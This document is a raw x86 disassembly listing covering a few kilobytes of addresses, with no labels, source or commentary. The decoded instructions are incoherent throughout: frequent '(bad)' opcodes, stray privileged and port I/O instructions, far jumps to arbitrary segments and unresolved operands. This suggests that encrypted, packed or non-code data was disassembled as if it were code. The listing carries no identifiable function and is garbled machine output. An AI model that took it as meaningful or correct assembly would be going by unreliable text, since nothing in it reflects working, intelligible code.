  42347c:	loopne 0x4234b6
  42347e:	jno    0x423427
  423480:	xchg   DWORD PTR [ecx-0x24],ecx
  423483:	arpl   dx,bp
  423485:	push   ecx
  423486:	xor    ecx,DWORD PTR [edx-0x15cc53c2]
  42348c:	arpl   WORD PTR [esi+edx*2+0x30e7d69d],cx
  423493:	mov    ebp,esi
  423495:	inc    ecx
  423496:	gs and edx,edi
  423499:	xor    BYTE PTR [edx-0x2e],ah
  42349c:	inc    BYTE PTR [edi]
  42349e:	rcr    DWORD PTR ds:0x410da369,cl
  4234a4:	sbb    BYTE PTR [ebx],al
  4234a6:	jecxz  0x4234e4
  4234a8:	mov    al,ds:0x522fe6cb
  4234ad:	lods   eax,DWORD PTR ds:[esi]
  4234ae:	ret    
  4234af:	mov    dh,0x4e
  4234b1:	pop    edi
  4234b2:	cmp    al,0x42
  4234b4:	mov    al,0xaf
  4234b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4234b7:	inc    ebx
  4234b8:	xor    BYTE PTR [esi],ch
  4234ba:	mul    DWORD PTR [ecx]
  4234bc:	dec    esi
  4234bd:	(bad)  [esi-0xe]
  4234c0:	lahf   
  4234c1:	aas    
  4234c2:	cmp    al,0xdc
  4234c4:	mov    DWORD PTR [esi+0x71817c7a],ecx
  4234ca:	in     eax,dx
  4234cb:	popfw  
  4234cd:	cmp    bh,BYTE PTR [edi+0x1b69a418]
  4234d3:	aas    
  4234d4:	sub    ah,0x40
  4234d7:	cmp    al,0xa3
  4234d9:	pop    esp
  4234da:	cmp    ch,BYTE PTR [ebx+0x50]
  4234dd:	pop    esp
  4234de:	sbb    eax,0x15fc6458
  4234e3:	lahf   
  4234e4:	adc    BYTE PTR [edx],bl
  4234e6:	or     ch,BYTE PTR [esi+0x5768de2]
  4234ec:	adc    DWORD PTR [edi+ebx*2-0x128a0a1e],0x64
  4234f4:	add    bh,BYTE PTR [edx-0x6c]
  4234f7:	loopne 0x42353a
  4234f9:	rep lods eax,DWORD PTR ds:[esi]
  4234fb:	jae    0x4234b0
  4234fd:	(bad)  [ebx+0x375dbc4b]
  423503:	cdq    
  423504:	push   es
  423505:	mov    dh,0x4
  423507:	pop    es
  423508:	and    ecx,DWORD PTR [edx+0x18450d9c]
  42350e:	fsub   st(6),st
  423510:	test   bl,bl
  423512:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423513:	sub    eax,0x809224cb
  423518:	stos   BYTE PTR es:[edi],al
  423519:	dec    ebx
  42351a:	loop   0x42350b
  42351c:	jecxz  0x423559
  42351e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42351f:	jnp    0x423596
  423521:	dec    esi
  423522:	sar    BYTE PTR [edi-0x1b],0x4a
  423526:	clc    
  423527:	mov    esi,ss
  423529:	and    dh,ch
  42352b:	and    DWORD PTR [ecx-0x2a4fbc12],ebx
  423531:	sub    cl,ah
  423533:	dec    edx
  423534:	or     BYTE PTR [ebx+0x3f611f25],cl
  42353a:	mov    esi,0x3996f84f
  42353f:	out    0xef,eax
  423541:	test   eax,0x1be05756
  423546:	fldcw  WORD PTR [edi-0x35103c1f]
  42354c:	scas   al,BYTE PTR es:[edi]
  42354d:	sub    BYTE PTR [esi+0x368a0282],bh
  423553:	repnz arpl WORD PTR [edx+0x63432dd1],cx
  42355a:	mov    bh,0x42
  42355c:	adc    eax,0xb6bdd105
  423561:	and    ch,cl
  423563:	ror    DWORD PTR [esi-0x40f7ab5],1
  423569:	inc    edi
  42356a:	int    0xbf
  42356c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42356d:	inc    esi
  42356e:	mov    ds:0x10f4a967,al
  423573:	scas   eax,DWORD PTR es:[edi]
  423574:	fist   DWORD PTR [esi+0x3698f9c0]
  42357a:	outs   dx,DWORD PTR ds:[esi]
  42357b:	mov    dh,dh
  42357d:	mov    dl,0xdb
  42357f:	out    dx,eax
  423580:	ficomp DWORD PTR [edx-0x65]
  423583:	sub    al,0x53
  423585:	push   0x3b4a0b99
  42358a:	mov    sp,0x38a2
  42358e:	xchg   ecx,eax
  42358f:	and    esp,ecx
  423591:	cmp    edx,ebp
  423593:	popf   
  423594:	clc    
  423595:	scas   eax,DWORD PTR es:[edi]
  423596:	dec    eax
  423597:	and    DWORD PTR [edx+0x51037d00],eax
  42359d:	lahf   
  42359e:	adc    al,cl
  4235a0:	push   eax
  4235a1:	sbb    al,0xb3
  4235a3:	call   0x3b59:0x43525802
  4235aa:	mov    cl,0x39
  4235ac:	stc    
  4235ad:	retf   0xeae0
  4235b0:	imul   DWORD PTR [ebx+0x7a]
  4235b3:	(bad)  
  4235b4:	out    0x5c,eax
  4235b6:	aas    
  4235b7:	inc    edi
  4235b8:	adc    DWORD PTR [edi],esp
  4235ba:	inc    ebp
  4235bb:	es xchg ebp,eax
  4235bd:	pop    ss
  4235be:	shl    BYTE PTR [edi+0x1e],0xbf
  4235c2:	jmp    0x672070a0
  4235c7:	cld    
  4235c8:	stos   BYTE PTR es:[edi],al
  4235c9:	mov    dl,cl
  4235cb:	shl    DWORD PTR [edi],0x97
  4235ce:	cmp    DWORD PTR [eax+0x5913b14d],ebp
  4235d4:	dec    DWORD PTR [esi]
  4235d6:	inc    eax
  4235d7:	lea    esi,[edi]
  4235d9:	in     eax,0xb5
  4235db:	jecxz  0x42357e
  4235dd:	loope  0x42360d
  4235df:	fbld   TBYTE PTR [eax+0x23]
  4235e2:	jp     0x4235da
  4235e4:	cmp    DWORD PTR [ebx+0x35],ebx
  4235e7:	lods   al,BYTE PTR ds:[esi]
  4235e8:	ss sbb dl,ah
  4235eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4235ec:	cli    
  4235ed:	push   esi
  4235ee:	or     BYTE PTR ds:0xd21197fe,bl
  4235f4:	ss xor eax,0x35c1f006
  4235fa:	ins    DWORD PTR es:[edi],dx
  4235fb:	je     0x423633
  4235fd:	(bad)  
  4235fe:	dec    edi
  4235ff:	outs   dx,BYTE PTR ds:[esi]
  423600:	push   0x68c033cd
  423605:	outs   dx,DWORD PTR ds:[esi]
  423606:	scas   al,BYTE PTR es:[edi]
  423607:	jle    0x423649
  423609:	push   0x3537f970
  42360e:	xchg   BYTE PTR [eax+0x74],dl
  423611:	mov    ebx,0x9b04f53f
  423616:	jbe    0x423689
  423618:	jbe    0x423666
  42361a:	das    
  42361b:	jae    0x4235b3
  42361d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42361e:	xchg   ebp,eax
  42361f:	jge    0x4235d8
  423621:	retf   0x39b9
  423624:	(bad)  
  423625:	fld    DWORD PTR [ebx]
  423627:	gs aam 0x82
  42362a:	cmp    esp,DWORD PTR [edx]
  42362c:	mov    ch,0x19
  42362e:	adc    eax,0x9f321ba5
  423633:	mov    bl,0x4e
  423635:	mov    esp,0xc4545eee
  42363a:	cmp    al,bl
  42363c:	addr16 dec esi
  42363e:	(bad)  
  42363f:	arpl   WORD PTR [ebx+0x7a],si
  423642:	in     eax,0x62
  423644:	jg     0x4235ce
  423646:	fdivr  DWORD PTR [ecx]
  423648:	test   DWORD PTR [ecx+edx*1+0x4fcf4b48],ebx
  42364f:	inc    eax
  423650:	jne    0x4235d7
  423652:	dec    edi
  423653:	ficom  WORD PTR [eax+ebp*8-0x7df2cee4]
  42365a:	or     ebx,DWORD PTR [esi+0x33]
  42365d:	and    al,0x55
  42365f:	sub    al,0xa1
  423661:	xchg   ebx,eax
  423662:	adc    ebp,DWORD PTR [esi-0x7a]
  423665:	adc    DWORD PTR [ebp+0x76e4e58c],edx
  42366b:	inc    edi
  42366c:	fisubr DWORD PTR [ebp+edx*8+0x6cf72a2f]
  423673:	sub    ebx,edi
  423675:	(bad)  
  423676:	loopne 0x423611
  423678:	push   ebx
  423679:	cmp    DWORD PTR [esi+0x5c6ea722],edx
  42367f:	stc    
  423680:	inc    esp
  423681:	dec    edx
  423682:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423683:	ret    0xa96b
  423686:	inc    edx
  423687:	popf   
  423688:	pop    ds
  423689:	lds    ebx,FWORD PTR [ebx-0x3e]
  42368c:	mov    WORD PTR ds:0x46af961d,es
  423692:	pop    esi
  423693:	mov    al,0xd4
  423695:	out    dx,eax
  423696:	push   eax
  423697:	jg     0x4236fd
  423699:	call   0x3353dfea
  42369e:	aas    
  42369f:	(bad)  
  4236a0:	mul    BYTE PTR [edx+0x1edd9f58]
  4236a6:	push   ebp
  4236a7:	adc    eax,0xe3db5445
  4236ac:	clc    
  4236ad:	lods   al,BYTE PTR ds:[esi]
  4236ae:	push   0x63
  4236b0:	shl    BYTE PTR [edi-0x3eb64037],1
  4236b6:	cld    
  4236b7:	mov    ah,0x43
  4236b9:	inc    esp
  4236ba:	add    cl,0x89
  4236bd:	aaa    
  4236be:	add    ah,BYTE PTR [edx]
  4236c0:	inc    ecx
  4236c1:	imul   eax,DWORD PTR [edx],0xfab151d4
  4236c7:	in     eax,dx
  4236c8:	add    eax,0x43d93031
  4236cd:	dec    esi
  4236ce:	in     al,0xdb
  4236d0:	sub    dh,bl
  4236d2:	lods   al,BYTE PTR ds:[esi]
  4236d3:	sbb    eax,0x7c5642aa
  4236d8:	lea    edi,[esp+esi*4-0x38]
  4236dc:	dec    eax
  4236dd:	cld    
  4236de:	adc    al,0xd7
  4236e1:	sbb    BYTE PTR [eiz*2+0xbc2f5a6],dh
  4236e8:	jb     0x423738
  4236ea:	xchg   ebx,eax
  4236eb:	mov    al,0x6
  4236ed:	push   ds
  4236ee:	jge    0x4236ab
  4236f0:	lahf   
  4236f1:	push   ebp
  4236f2:	mov    al,ds:0x8009343d
  4236f7:	in     al,0x99
  4236f9:	daa    
  4236fa:	add    al,0xdb
  4236fc:	jle    0x4236ee
  4236fe:	jnp    0x42369b
  423700:	push   ecx
  423701:	adc    DWORD PTR [ebp+0x66],ecx
  423704:	int    0x85
  423706:	jno    0x4236a3
  423708:	(bad)  [ecx-0x34b41c51]
  42370e:	jmp    0x42376c
  423710:	enter  0x7c53,0xc7
  423714:	dec    ebp
  423715:	call   0x3b8a:0x1f44c3f
  42371c:	pop    ecx
  42371d:	fld    QWORD PTR [edx-0x9]
  423720:	nop
  423721:	pop    edi
  423722:	push   esp
  423723:	sbb    DWORD PTR [edi],esp
  423725:	mov    edx,0xa72a73a4
  42372a:	(bad)  
  42372b:	test   al,0x22
  42372d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42372e:	scas   al,BYTE PTR es:[edi]
  42372f:	mov    cl,0xf2
  423731:	mov    cl,0x36
  423733:	jmp    0x49b3377d
  423738:	cmp    al,0x55
  42373a:	mov    cl,0x96
  42373c:	cli    
  42373d:	stos   DWORD PTR es:[edi],eax
  42373e:	add    eax,0x3565e16a
  423743:	stos   DWORD PTR es:[edi],eax
  423744:	adc    cl,cl
  423746:	addr16 aam 0xcd
  423749:	test   ah,ah
  42374b:	stos   BYTE PTR es:[edi],al
  42374c:	cmp    al,cl
  42374e:	retf   0x759f
  423751:	jge    0x423762
  423753:	cmp    al,0xfb
  423755:	(bad)  
  423757:	pop    eax
  423758:	dec    eax
  423759:	pop    ecx
  42375a:	mov    esi,0xfde3db0f
  42375f:	stos   BYTE PTR es:[edi],al
  423760:	cld    
  423761:	pop    ds
  423762:	push   esi
  423763:	mov    bl,0x64
  423765:	and    al,0xcd
  423767:	sub    DWORD PTR [eax],edi
  423769:	xor    bh,BYTE PTR [eax-0x4f44807c]
  42376f:	in     al,dx
  423770:	mov    eax,ds:0x99fbea2e
  423775:	cs dec edx
  423777:	mov    ch,0x26
  423779:	jae    0x4237b7
  42377b:	cli    
  42377c:	repz fisttp DWORD PTR [ecx]
  42377f:	in     eax,0xad
  423781:	mov    ebx,0xbb67fa14
  423786:	les    esp,FWORD PTR [esi]
  423788:	fs mov edi,0x52ad6b7b
  42378e:	test   al,0x23
  423790:	push   ss
  423791:	out    0x6c,eax
  423793:	hlt    
  423794:	cli    
  423795:	retf   
  423796:	lods   eax,DWORD PTR ds:[esi]
  423797:	add    esp,esi
  423799:	push   ds
  42379a:	mov    dh,0xba
  42379c:	fisttp QWORD PTR [ebp+0x26]
  42379f:	pop    edi
  4237a0:	mov    edx,0x7349a434
  4237a5:	int3   
  4237a6:	fsubr  st(6),st
  4237a8:	in     al,0x19
  4237aa:	loop   0x42374a
  4237ac:	jp     0x423768
  4237ae:	jb     0x423747
  4237b0:	jmp    0x4237e9
  4237b2:	jno    0x4237a0
  4237b4:	fnstsw WORD PTR [ecx-0x7b323282]
  4237ba:	aas    
  4237bb:	and    al,0x23
  4237bd:	in     al,0xfa
  4237bf:	int3   
  4237c0:	(bad)  
  4237c1:	add    ecx,ebp
  4237c3:	or     esi,DWORD PTR [ebx]
  4237c5:	call   0x97839eec
  4237ca:	int    0x14
  4237cc:	ficomp DWORD PTR [ebx]
  4237ce:	add    BYTE PTR [ecx],cl
  4237d0:	pushf  
  4237d1:	and    al,0xd7
  4237d3:	mov    edi,DWORD PTR [esi]
  4237d5:	imul   ecx,DWORD PTR [ebx+0x59],0x49f8cf36
  4237dc:	push   ebx
  4237dd:	dec    ebp
  4237de:	mov    esi,0xdef88b13
  4237e3:	push   0x70
  4237e5:	dec    edi
  4237e7:	dec    edi
  4237e8:	je     0x4237ab
  4237ea:	sub    BYTE PTR [edx+0x50b4683b],cl
  4237f0:	push   esp
  4237f1:	sub    al,0x30
  4237f3:	imul   esi,DWORD PTR [eax-0x136966b1],0x30e545c8
  4237fd:	mov    cl,0x83
  4237ff:	aam    0x8
  423801:	call   0x6130c6cd
  423806:	fild   QWORD PTR [eax]
  423808:	jg     0x423865
  42380a:	pop    eax
  42380b:	loopne 0x423826
  42380d:	(bad)
  423810:	mov    ah,0x8d
  423812:	xchg   esp,eax
  423813:	lods   eax,DWORD PTR es:[esi]
  423815:	adc    DWORD PTR [ebx],ebp
  423817:	je     0x4237bf
  423819:	mov    ah,0x1b
  42381b:	es push esp
  42381d:	mov    al,0xaf
  42381f:	jns    0x4237bc
  423821:	push   ecx
  423822:	shl    DWORD PTR [eax-0x55],0xe7
  423826:	out    dx,eax
  423827:	adc    bl,ah
  423829:	repz mov dl,0xd1
  42382c:	lods   eax,DWORD PTR ds:[esi]
  42382d:	add    ch,BYTE PTR [edx]
  42382f:	mov    eax,0xd646aa38
  423834:	jmp    0x60933528
  423839:	mov    ds:0x7d28186f,eax
  42383e:	in     eax,0x4b
  423840:	ds mov ebx,0xa81b3d9
  423846:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423847:	lods   al,BYTE PTR ds:[esi]
  423848:	or     al,0x71
  42384a:	fld    DWORD PTR [edi]
  42384c:	cmp    eax,0xd2452ea7
  423851:	lods   al,BYTE PTR ds:[esi]
  423852:	std    
  423853:	fs stc 
  423855:	icebp  
  423856:	fld    st(2)
  423858:	adc    eax,0x532f0efc
  42385e:	dec    edx
  42385f:	test   eax,0x1ffc1419
  423864:	inc    esi
  423865:	dec    ebx
  423866:	lods   eax,DWORD PTR ds:[esi]
  423867:	lods   al,BYTE PTR ds:[esi]
  423868:	mov    cl,0xf2
  42386a:	mov    cl,0xea
  42386c:	ins    DWORD PTR es:[edi],dx
  42386d:	dec    edx
  42386e:	mov    edi,0xc1f9cdef
  423873:	push   ds
  423874:	fs clc 
  423876:	push   ebx
  423877:	inc    eax
  423878:	jnp    0x423820
  42387a:	xor    BYTE PTR [edx+0x3a54d95],0x7d
  423881:	xchg   edi,eax
  423882:	mov    esi,0xee723437
  423887:	push   edi
  423888:	add    DWORD PTR [edx],eax
  42388a:	mov    dl,0x6d
  42388c:	pushf  
  42388d:	aas    
  42388e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42388f:	dec    ebx
  423890:	stos   DWORD PTR es:[edi],eax
  423891:	sahf   
  423892:	(bad)  
  423893:	shr    DWORD PTR [ebx-0x5c10450e],1
  423899:	jno    0x423863
  42389b:	(bad)  
  42389c:	or     al,0xa4
  42389e:	xor    ebp,ecx
  4238a0:	sahf   
  4238a1:	or     edx,DWORD PTR [edx+0x4f2afc97]
  4238a7:	or     al,0x6
  4238a9:	mov    DWORD PTR [ebx+0x674b4cf8],edx
  4238af:	test   eax,0x954da824
  4238b4:	gs mov ebx,0x156e6152
  4238ba:	jmp    0x423925
  4238bc:	les    ebp,FWORD PTR [ecx+edi*8-0x20d4b18b]
  4238c3:	enter  0x3028,0x9b
  4238c7:	xchg   esi,edi
  4238c9:	ins    DWORD PTR es:[edi],dx
  4238ca:	xchg   ecx,esi
  4238cc:	mov    WORD PTR [edx+0x63b7ec14],ss
  4238d2:	dec    BYTE PTR [ecx-0x49fa023c]
  4238d8:	js     0x423882
  4238da:	adc    eax,0x7e0c820a
  4238df:	jle    0x4238a6
  4238e1:	sub    eax,0x189ae697
  4238e6:	mov    ds:0xd31ab4bc,eax
  4238eb:	je     0x4238cb
  4238ed:	hlt    
  4238ee:	repnz mov esp,0x94db4ff0
  4238f4:	icebp  
  4238f5:	(bad)  
  4238f6:	outs   dx,DWORD PTR ds:[esi]
  4238f7:	test   BYTE PTR [ebx+edi*2],al
  4238fa:	fdivr  DWORD PTR [edx-0xb18f9e9]
  423900:	fwait
  423901:	xchg   edi,eax
  423902:	sti    
  423903:	aad    0xf9
  423905:	jp     0x4238ae
  423907:	cmp    eax,0xf47786b0
  42390c:	xlat   BYTE PTR ds:[ebx]
  42390d:	add    bh,bh
  42390f:	(bad)  
  423910:	pop    edx
  423911:	out    dx,eax
  423912:	push   es
  423913:	aam    0x84
  423915:	add    DWORD PTR [ebp-0xf],esi
  423918:	cs loope 0x423964
  42391b:	leave  
  42391c:	fwait
  42391d:	outs   dx,BYTE PTR ds:[esi]
  42391e:	jbe    0x423994
  423920:	retf   
  423921:	push   edx
  423922:	jge    0x4238c9
  423924:	paddb  mm5,QWORD PTR [ebx+0x6d7549e9]
  42392b:	sbb    eax,0x57dd35c6
  423930:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423931:	cmp    eax,ebx
  423933:	data16 sbb al,BYTE PTR [ebp+0x58b69442]
  42393a:	enter  0xf2a1,0xf1
  42393e:	es out dx,al
  423940:	(bad)  
  423942:	hlt    
  423943:	mov    ecx,0x9e98e1c3
  423948:	in     al,dx
  423949:	pop    ecx
  42394a:	fmul   DWORD PTR [esi]
  42394c:	in     al,dx
  42394d:	push   ds
  42394e:	and    al,0x94
  423950:	xor    BYTE PTR [edi+0x747c1771],cl
  423956:	push   edx
  423957:	mov    dh,0x31
  423959:	add    al,0xff
  42395b:	inc    eax
  42395c:	mov    cs,WORD PTR [ebp+edx*1+0xe]
  423960:	daa    
  423961:	fst    DWORD PTR [edi+0x4c2da68]
  423967:	test   eax,0xa3124173
  42396d:	push   cs
  42396e:	dec    ecx
  42396f:	test   eax,0xdc360563
  423974:	mov    BYTE PTR [ebp+0x6b],ah
  423977:	icebp  
  423978:	pop    edx
  423979:	xchg   esi,eax
  42397a:	add    al,BYTE PTR [ecx-0xc]
  42397d:	mov    ah,0x73
  42397f:	fwait
  423980:	iret   
  423981:	jl     0x423971
  423983:	mov    edi,DWORD PTR [esi+ecx*1-0x616af041]
  42398a:	retf   0x5e96
  42398d:	enter  0xb697,0x7d
  423991:	jg     0x4239ca
  423993:	and    eax,0x36ef146f
  423998:	mov    edi,0x1655745d
  42399d:	fsubr  st(3),st
  42399f:	arpl   WORD PTR [ebx],di
  4239a1:	arpl   WORD PTR [ecx+0x63],bx
  4239a4:	into   
  4239a5:	push   0x5e1ec14
  4239aa:	cmp    BYTE PTR [esi-0x31a34aec],bh
  4239b0:	enter  0x45e,0xce
  4239b4:	arpl   WORD PTR ds:[ecx],bp
  4239b7:	das    
  4239b8:	and    edx,esp
  4239ba:	inc    edx
  4239bb:	mov    eax,ds:0x45ec7452
  4239c0:	nop    DWORD PTR [ebp-0x79]
  4239c4:	cs xchg edi,eax
  4239c6:	call   0xc7208403
  4239cb:	sbb    eax,0xcb807ddd
  4239d0:	scas   eax,DWORD PTR es:[edi]
  4239d1:	test   cl,cl
  4239d3:	or     eax,0x14625dca
  4239d8:	repz pop ebp
  4239da:	enter  0xbd4e,0xf3
  4239de:	cmc    
  4239df:	adc    ecx,DWORD PTR [edx+0x68993ee4]
  4239e5:	ins    BYTE PTR es:[edi],dx
  4239e6:	dec    edi
  4239e7:	cmp    DWORD PTR [edi+0x40],ecx
  4239ea:	fild   QWORD PTR [edx+eiz*4-0x16]
  4239ee:	and    eax,0xd189218b
  4239f3:	mov    edi,0xa61f3b49
  4239f8:	cdq    
  4239f9:	inc    edi
  4239fa:	xchg   ebp,eax
  4239fb:	(bad)  
  4239fd:	int    0xe4
  4239ff:	jle    0x423a7a
  423a01:	clc    
  423a02:	retf   0x2e16
  423a05:	test   al,0x4a
  423a07:	in     al,dx
  423a08:	cld    
  423a09:	in     al,0xa1
  423a0b:	sub    al,0x1f
  423a0d:	push   esi
  423a0e:	cli    
  423a0f:	cmp    ebp,DWORD PTR [ecx+0x47]
  423a12:	push   DWORD PTR [eax+0x15fa5101]
  423a18:	and    ah,BYTE PTR [ecx-0x6ffc729f]
  423a1e:	popa   
  423a1f:	bnd jl 0x423a7e
  423a22:	push   ds
  423a23:	xchg   ebp,eax
  423a24:	mov    edx,0x49d66b38
  423a29:	popf   
  423a2a:	ins    BYTE PTR es:[edi],dx
  423a2b:	aas    
  423a2c:	iret   
  423a2d:	add    esi,esp
  423a2f:	mov    bl,0x43
  423a31:	or     DWORD PTR [edx],eax
  423a33:	ins    DWORD PTR es:[edi],dx
  423a34:	add    DWORD PTR [edx-0x12],ebp
  423a37:	jns    0x4239cf
  423a39:	rol    DWORD PTR [edi],0x40
  423a3c:	sbb    BYTE PTR [edx-0x59032a16],al
  423a42:	stc    
  423a43:	lock and BYTE PTR [ebp+0x3f50f7ea],cl
  423a4a:	mov    dl,0x56
  423a4c:	cmp    al,0xd3
  423a4e:	stos   BYTE PTR es:[edi],al
  423a4f:	fsubr  QWORD PTR [ecx-0x3c]
  423a52:	xor    bl,BYTE PTR [ecx+edi*8]
  423a55:	dec    eax
  423a56:	dec    edi
  423a57:	mov    cl,0x13
  423a59:	stos   DWORD PTR es:[edi],eax
  423a5a:	retf   0x7f39
  423a5d:	call   0x9183:0xff01feba
  423a64:	add    BYTE PTR [ebx-0x35e716a],dl
  423a6a:	scas   al,BYTE PTR es:[edi]
  423a6b:	or     al,BYTE PTR [eax-0x6f]
  423a6e:	pop    ebx
  423a6f:	jbe    0x423aab
  423a71:	lods   al,BYTE PTR ds:[esi]
  423a72:	in     eax,0x81
  423a74:	inc    eax
  423a75:	dec    ebx
  423a76:	mov    ds:0x12233d2f,al
  423a7b:	int3   
  423a7c:	jle    0x352a66ea
  423a82:	xchg   DWORD PTR [eax+eiz*8],eax
  423a85:	mov    ds:0x13d170f,al
  423a8a:	or     edx,DWORD PTR [esi-0x53]
  423a8d:	sub    al,BYTE PTR [ebx+esi*1+0x6a6162b9]
  423a94:	xchg   esi,eax
  423a95:	daa    
  423a96:	xor    DWORD PTR [edx-0x47ef77c5],ebx
  423a9c:	xor    ch,BYTE PTR [ebp-0x26]
  423a9f:	add    BYTE PTR [edi+0x2fe1da21],cl
  423aa5:	mov    WORD PTR [edi+0x49808306],ss
  423aab:	pop    esp
  423aac:	pop    esp
  423aad:	push   eax
  423aae:	sti    
  423aaf:	adc    al,0xb4
  423ab1:	fnstenv [ebx-0x4f]
  423ab4:	test   bh,0x78
  423ab7:	pop    esp
  423ab8:	(bad)  
  423ab9:	sbb    al,0xd
  423abb:	jbe    0x423a66
  423abd:	or     al,0x99
  423abf:	pop    edx
  423ac0:	mov    ecx,0x31ff1648
  423ac5:	addr16 call 0xade55d40
  423acb:	outs   dx,BYTE PTR ds:[esi]
  423acc:	je     0x423abd
  423ace:	mov    BYTE PTR [esi+0x69],dh
  423ad1:	inc    ebx
  423ad2:	inc    esp
  423ad3:	stc    
  423ad4:	pusha  
  423ad5:	cwde   
  423ad6:	dec    edx
  423ad7:	scas   eax,DWORD PTR es:[edi]
  423ad8:	daa    
  423ad9:	stos   DWORD PTR es:[edi],eax
  423ada:	xor    BYTE PTR ds:0x4745c5e1,cl
  423ae0:	cmp    al,0x7f
  423ae2:	das    
  423ae3:	jmp    0x2eaa:0x841204b4
  423aea:	mov    ebx,0x30c20fde
  423aef:	data16 mov ah,0x94
  423af2:	scas   eax,DWORD PTR es:[edi]
  423af3:	push   cs
  423af4:	fisttp WORD PTR [edx-0x286d4490]
  423afa:	jb     0x423b66
  423afc:	mov    cl,0xea
  423afe:	sub    DWORD PTR ds:[edx],esi
  423b01:	mov    ch,0x45
  423b03:	mov    eax,0x9bae0a8
  423b08:	pop    eax
  423b09:	jecxz  0x423a8c
  423b0b:	xor    ah,ah
  423b0d:	mov    DWORD PTR [esp+edi*2+0x42e1196f],esp
  423b14:	out    0x6f,eax
  423b16:	sub    al,cl
  423b18:	mov    esi,0xd2de6464
  423b1d:	loope  0x423b97
  423b1f:	stos   DWORD PTR es:[edi],eax
  423b20:	add    al,0xd
  423b22:	mov    ecx,0x64684f63
  423b27:	mov    fs,WORD PTR [eax+0x50]
  423b2a:	fsubr  DWORD PTR [edx]
  423b2c:	xor    al,0x53
  423b2e:	retf   
  423b2f:	retf   0xb99b
  423b32:	pushf  
  423b33:	loop   0x423ae9
  423b35:	cmp    al,0x91
  423b37:	adc    DWORD PTR [eax],eax
  423b39:	mov    ecx,0x6ee3b9ef
  423b3e:	fistp  QWORD PTR [ecx+0x203b0142]
  423b44:	ins    DWORD PTR es:[edi],dx
  423b45:	fwait
  423b46:	in     eax,dx
  423b47:	push   0x70d796bd
  423b4c:	mov    eax,ds:0x6ceef3d3
  423b51:	(bad)  
  423b52:	mov    tr3,ebp
  423b55:	mov    esp,0x4cb68c0e
  423b5a:	or     esi,DWORD PTR ds:0xf7668dee
  423b60:	icebp  
  423b61:	adc    BYTE PTR [edi+0x5cc9bcb8],cl
  423b67:	sti    
  423b68:	or     BYTE PTR [eax-0x6e65de39],dh
  423b6e:	push   esi
  423b6f:	mov    DWORD PTR [eax-0x70],eax
  423b72:	popa   
  423b73:	js     0x423bd3
  423b75:	int    0x34
  423b77:	fs call 0x538c:0xdb521ba9
  423b7f:	push   ecx
  423b80:	mov    BYTE PTR [ebp-0x8566af2],dl
  423b86:	ret    0xd0d7
  423b89:	sub    DWORD PTR [edx],ebp
  423b8b:	(bad)  
  423b8c:	jbe    0x423b88
  423b8e:	or     bl,BYTE PTR [eax+0x49522cf9]
  423b94:	cld    
  423b95:	outs   dx,DWORD PTR ds:[esi]
  423b96:	imul   ecx,DWORD PTR ss:[ecx],0x3d07e679
  423b9d:	pop    edx
  423b9e:	ror    BYTE PTR [esi-0x43],1
  423ba1:	stos   BYTE PTR es:[edi],al
  423ba2:	mov    esp,0x2758feb1
  423ba7:	popf   
  423ba8:	ss repz test edx,esi
  423bac:	jl     0x423b91
  423bae:	(bad)  
  423baf:	fnsave ds:0x18283667
  423bb5:	mov    ecx,0x794502f1
  423bba:	cwde   
  423bbb:	frstor [eax]
  423bbd:	jmp    0x619f:0xefa9d053
  423bc4:	mov    edi,0x7a53b266
  423bc9:	or     BYTE PTR ss:[edx-0x4d3d0a73],al
  423bd0:	and    eax,0xda51d819
  423bd5:	inc    edx
  423bd6:	mov    dh,0x66
  423bd8:	ret    0xa34
  423bdb:	fst    DWORD PTR [edx]
  423bdd:	cdq    
  423bde:	test   DWORD PTR [ebp-0x2b073968],0x10bd44bc
  423be8:	sbb    eax,0xb07e6839
  423bed:	in     al,0x41
  423bef:	jge    0x423b89
  423bf1:	clc    
  423bf2:	(bad)  
  423bf3:	sbb    bx,WORD PTR [esi+eax*1-0x7bd20f6d]
  423bfb:	aas    
  423bfc:	fxtract 
  423bfe:	jmp    0x3476:0xa8a490de
  423c05:	enter  0x33ab,0xae
  423c09:	xor    esi,DWORD PTR [edx-0x57]
  423c0c:	(bad)  
  423c0d:	fisttp DWORD PTR [ebp+0x7c]
  423c10:	hlt    
  423c11:	fsub   st(4),st
  423c13:	loopne 0x423c21
  423c15:	xchg   esi,eax
  423c16:	mov    ch,0xf4
  423c18:	add    eax,0x68344b30
  423c1d:	mov    bh,0x58
  423c1f:	pop    ds
  423c20:	xor    al,0xc8
  423c22:	lods   eax,DWORD PTR ds:[esi]
  423c23:	add    dl,BYTE PTR [ebp-0x50e7c153]
  423c29:	popa   
  423c2a:	out    dx,eax
  423c2b:	mov    ?,WORD PTR [eax]
  423c2d:	ret    
  423c2e:	or     al,0x1f
  423c30:	xchg   edi,eax
  423c31:	in     al,dx
  423c32:	shl    DWORD PTR [ebx],cl
  423c34:	(bad)  
  423c35:	pop    edx
  423c36:	inc    ebp
  423c37:	fistp  WORD PTR [eax+edi*8-0x5f56e835]
  423c3e:	test   bl,dh
  423c40:	arpl   WORD PTR [ebx+0x599b148],sp
  423c46:	loop   0x423cbd
  423c48:	and    ch,BYTE PTR [eax]
  423c4a:	ja     0x423c9e
  423c4c:	cs rol ch,1
  423c4f:	push   eax
  423c50:	rol    bh,cl
  423c52:	mov    ds:0x4425083f,eax
  423c57:	in     al,0xb6
  423c59:	(bad)  
  423c5a:	add    BYTE PTR [edi],ch
  423c5c:	aas    
  423c5d:	mov    al,0xd1
  423c5f:	push   ss
  423c60:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423c61:	out    0x32,eax
  423c63:	and    eax,0x9e1488f3
  423c68:	and    ch,BYTE PTR [edi]
  423c6a:	sub    BYTE PTR [ecx+0x531e7e49],cl
  423c70:	sbb    esp,eax
  423c72:	mov    WORD PTR [edi-0x48],?
  423c75:	(bad)  [ebx+ebp*2+0x5f39f0d5]
